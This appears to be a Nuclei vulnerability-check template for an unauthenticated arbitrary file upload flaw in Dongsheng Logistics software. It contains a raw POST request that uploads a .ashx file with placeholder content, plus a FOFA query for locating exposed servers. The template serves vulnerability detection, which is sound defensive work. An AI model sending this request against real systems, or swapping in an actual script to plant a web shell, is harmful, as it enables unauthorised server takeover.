id: dongshengwuliu-uploadmailfile-fileupload

info:
  name: 东胜物流 UploadMailFile 任意文件上传
  author: bl
  severity: high
  description: |
    东胜物流软件的/CommMng/Print/UploadMailFile接口存在任意文件上传漏洞，未经身份验证的攻击者可以通过该漏洞上传恶意脚本文件，从而控制目标服务器。
    fofa: body="dhtmlxcombo_whp.js"
  reference:
    - https://cn-sec.com/archives/4243708.html
  classification:
    cwe-id: CWE-434
  metadata:
    verified: true
  tags: 东胜物流软件

http:
  - raw:
      - |
        POST /CommMng/Print/UploadMailFile HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
        Accept-Encoding: gzip
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
        Content-Length: 456

        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="LoadFile"; filename="{{randstr}}.ashx"
        Content-Type: application/octet-stream

        123
        ------WebKitFormBoundary7MA4YWxkTrZu0gW

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "success"
        part: body
      - type: word
        words:
          - "上传成功"
        part: body